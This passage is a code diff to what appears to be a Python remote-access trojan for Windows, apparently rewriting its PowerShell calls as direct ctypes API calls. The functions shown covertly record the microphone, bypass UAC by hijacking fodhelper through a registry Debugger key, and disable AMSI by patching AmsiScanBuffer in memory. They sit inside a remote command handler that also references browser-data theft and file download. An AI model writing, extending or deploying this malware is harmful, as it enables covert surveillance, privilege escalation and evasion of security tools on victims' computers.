-            "[AudioIn]::waveInUnprepareHeader($h,[ref]$hdr,[System.Runtime.InteropServices.Marshal]::SizeOf($hdr));"
-            "[AudioIn]::waveInClose($h);"
-            "$data=New-Object byte[] $hdr.dwBytesRecorded;"
-            "[System.Runtime.InteropServices.Marshal]::Copy($hdr.lpData,$data,0,$hdr.dwBytesRecorded);"
-            "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($hdr.lpData);"
-            "$w.Write($data);$w.Close();"
-        )
-        r = subprocess.run(
-            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
-            capture_output=True, text=True, timeout=duration + 10
-        )
-        if os.path.isfile(tmp) and os.path.getsize(tmp) > 1000:
-            with open(tmp, 'rb') as f:
+        winmm = ctypes.windll.winmm
+        class WAVEFORMATEX(ctypes.Structure):
+            _fields_ = [("wFormatTag", ctypes.c_ushort), ("nChannels", ctypes.c_ushort),
+                        ("nSamplesPerSec", ctypes.c_ulong), ("nAvgBytesPerSec", ctypes.c_ulong),
+                        ("nBlockAlign", ctypes.c_ushort), ("wBitsPerSample", ctypes.c_ushort),
+                        ("cbSize", ctypes.c_ushort)]
+        class WAVEHDR(ctypes.Structure):
+            _fields_ = [("lpData", ctypes.c_void_p), ("dwBufferLength", ctypes.c_ulong),
+                        ("dwBytesRecorded", ctypes.c_ulong), ("dwUser", ctypes.c_void_p),
+                        ("dwFlags", ctypes.c_ulong), ("dwLoops", ctypes.c_ulong),
+                        ("lpNext", ctypes.c_void_p), ("reserved", ctypes.c_ulong)]
+        fmt = WAVEFORMATEX()
+        fmt.wFormatTag = 1
+        fmt.nChannels = 1
+        fmt.nSamplesPerSec = 22050
+        fmt.nAvgBytesPerSec = 44100
+        fmt.nBlockAlign = 2
+        fmt.wBitsPerSample = 16
+        fmt.cbSize = 0
+        hwi = ctypes.c_void_p()
+        r = winmm.waveInOpen(ctypes.byref(hwi), 1, ctypes.byref(fmt), 0, 0, 0)
+        if r != 0:
+            return None
+        buf_size = 22050 * duration * 2
+        buf = ctypes.create_string_buffer(buf_size)
+        hdr = WAVEHDR()
+        hdr.lpData = ctypes.addressof(buf)
+        hdr.dwBufferLength = buf_size
+        winmm.waveInPrepareHeader(hwi, ctypes.byref(hdr), ctypes.sizeof(hdr))
+        winmm.waveInAddBuffer(hwi, ctypes.byref(hdr), ctypes.sizeof(hdr))
+        winmm.waveInStart(hwi)
+        time.sleep(duration)
+        winmm.waveInStop(hwi)
+        winmm.waveInUnprepareHeader(hwi, ctypes.byref(hdr), ctypes.sizeof(hdr))
+        winmm.waveInClose(hwi)
+        recorded = hdr.dwBytesRecorded
+        if recorded > 1000:
+            with open(tmp, "wb") as f:
+                f.write(b"RIFF")
+                f.write(struct.pack("<I", 36 + recorded))
+                f.write(b"WAVEfmt ")
+                f.write(struct.pack("<IHHIIHH", 16, 1, 1, 22050, 44100, 2, 16))
+                f.write(b"data")
+                f.write(struct.pack("<I", recorded))
+                f.write(buf.raw[:recorded])
+            with open(tmp, "rb") as f:
                 data = f.read()
-            try: os.remove(tmp)
-            except: pass
+            os.remove(tmp)
             return data
     except Exception as e:
         dprint(f"Audio error: {{e}}")
@@ -701,34 +896,45 @@ def steal_browser():
 def uac_bypass():
     try:
         exe = os.path.abspath(sys.argv[0])
-        method = "fodhelper"
-        reg_path = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\fodhelper.exe"
-        ps = (
-            f"New-Item -Path '{{reg_path}}' -Force|Out-Null;"
-            f"Set-ItemProperty -Path '{{reg_path}}' -Name 'Debugger' -Value '{{exe}}';"
-            "Start-Process fodhelper.exe -WindowStyle Hidden;"
-            "Start-Sleep 3;"
-            f"Remove-ItemProperty -Path '{{reg_path}}' -Name 'Debugger' -Force;"
-            f"Remove-Item -Path '{{reg_path}}' -Force"
-        )
-        r = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
-                           capture_output=True, text=True, timeout=15)
-        return "UAC bypass attempted (fodhelper)" if r.returncode == 0 else f"UAC bypass failed: {{r.stderr[:200]}}"
+        reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\fodhelper.exe"
+        try:
+            k = ctypes.windll.advapi32.RegCreateKeyExW(
+                ctypes.windll.user32.HKEY_CURRENT_USER, reg_path, 0, None, 0, 0x20006, None,
+                ctypes.byref(ctypes.c_void_p()), None)
+            if k:
+                ctypes.windll.advapi32.RegSetValueExW(k, "Debugger", 0, 1, exe, len(exe)*2)
+                ctypes.windll.advapi32.RegCloseKey(k)
+        except: pass
+        subprocess.Popen(["fodhelper.exe"], creationflags=0x08000000)
+        time.sleep(3)
+        try:
+            k = ctypes.windll.advapi32.RegOpenKeyExW(
+                ctypes.windll.user32.HKEY_CURRENT_USER, reg_path, 0, 0x20006, ctypes.byref(ctypes.c_void_p()))
+            if k:
+                ctypes.windll.advapi32.RegDeleteValueW(k, "Debugger")
+                ctypes.windll.advapi32.RegCloseKey(k)
+        except: pass
+        try:
+            ctypes.windll.advapi32.RegDeleteKeyW(ctypes.windll.user32.HKEY_CURRENT_USER, reg_path)
+        except: pass
+        return "UAC bypass attempted (fodhelper)"
     except Exception as e:
         return f"UAC bypass error: {{e}}"
 
 def amsi_bypass():
     try:
-        ps = (
-            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')."
-            "GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
-            "Write-Output 'AMSI_BYPASSED'"
-        )
-        r = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
-                           capture_output=True, text=True, timeout=10)
-        if "AMSI_BYPASSED" in r.stdout:
-            return "AMSI bypassed for current session"
-        return f"AMSI result: {{r.stdout.strip()[:100]}}"
+        k32 = ctypes.windll.kernel32
+        h = k32.GetModuleHandleW("amsi.dll")
+        if not h:
+            return "amsi.dll not loaded"
+        addr = k32.GetProcAddress(h, b"AmsiScanBuffer")
+        if not addr:
+            return "AmsiScanBuffer not found"
+        old = ctypes.c_ulong(0)
+        k32.VirtualProtect(addr, 1, 0x40, ctypes.byref(old))
+        ctypes.memmove(addr, b"\xc3", 1)
+        k32.VirtualProtect(addr, 1, old.value, ctypes.byref(old))
+        return "AMSI bypassed (AmsiScanBuffer patched)"
     except Exception as e:
         return f"AMSI error: {{e}}"
 
@@ -764,9 +970,9 @@ def handle_command(cmd_text):
     elif cmd == "setclip":
         if args:
             try:
-                subprocess.run(["powershell", "-NoProfile", "-Command", f"Set-Clipboard -Value '{{args.replace(chr(39), chr(39)+chr(39))}}'"],
-                               capture_output=True, timeout=5)
-                return f"Clipboard set to: {{args[:50]}}"
+                if _set_clipboard(args):
+                    return f"Clipboard set to: {{args[:50]}}"
+                return "Failed to set clipboard"
             except: return "Failed to set clipboard"
         return "Usage: setclip <text>"
     elif cmd == "wifi":
@@ -796,30 +1002,27 @@ def handle_command(cmd_text):
             info_items.append(f"Arch: {{platform.machine()}}")
             info_items.append(f"CPU: {{platform.processor() or 'N/A'}}")
             try:
-                r = subprocess.run("wmic OS get FreePhysicalMemory /Value", shell=True, capture_output=True, text=True, timeout=5)
-                for line in r.stdout.split('\n'):
-                    if "FreePhysicalMemory" in line and "=" in line:
-                        kb = int(line.split("=")[1].strip())
-                        info_items.append(f"Free RAM: {{kb/1048576:.1f}} GB")
+                k32 = ctypes.windll.kernel32
+                class MEMORYSTATUSEX(ctypes.Structure):
+                    _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
+                                ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
+                                ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
+                                ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
+                                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
+                mem = MEMORYSTATUSEX()
+                mem.dwLength = ctypes.sizeof(mem)
+                k32.GlobalMemoryStatusEx(ctypes.byref(mem))
+                info_items.append(f"Free RAM: {{mem.ullAvailPhys / (1024**3):.1f}} GB")
+                info_items.append(f"Total RAM: {{mem.ullTotalPhys / (1024**3):.1f}} GB")
             except: pass
             try:
-                r = subprocess.run("wmic OS get TotalVisibleMemorySize /Value", shell=True, capture_output=True, text=True, timeout=5)
-                for line in r.stdout.split('\n'):
-                    if "TotalVisibleMemorySize" in line and "=" in line:
-                        kb = int(line.split("=")[1].strip())
-                        info_items.append(f"Total RAM: {{kb/1048576:.1f}} GB")
-            except: pass
-            try:
-                r = subprocess.run("wmic logicaldisk get Size,FreeSpace,DeviceID /FORMAT:CSV", shell=True, capture_output=True, text=True, timeout=5)
-                for line in r.stdout.strip().split('\n')[1:]:
-                    p2 = line.strip().split(',')
-                    if len(p2) >= 4 and p2[2]:
-                        free_gb = int(p2[2]) / 1073741824 if p2[2].isdigit() else 0
-                        total_gb = int(p2[3]) / 1073741824 if p2[3].isdigit() else 0
-                        info_items.append(f"  {{p2[1]}} {{free_gb:.1f}}GB free / {{total_gb:.1f}}GB")
+                free = ctypes.c_ulonglong(0)
+                total = ctypes.c_ulonglong(0)
+                ctypes.windll.kernel32.GetDiskFreeSpaceExW("C:\\\\", None, ctypes.byref(total), ctypes.byref(free))
+                info_items.append(f"  C: {{free.value / (1024**3):.1f}}GB free / {{total.value / (1024**3):.1f}}GB")
             except: pass
             info_items.append(f"CWD: {{os.getcwd()}}")
-            return "\n".join(info_items)
+            return "\\n".join(info_items)
         except Exception as e:
             return f"Error: {{e}}"
     elif cmd == "download":
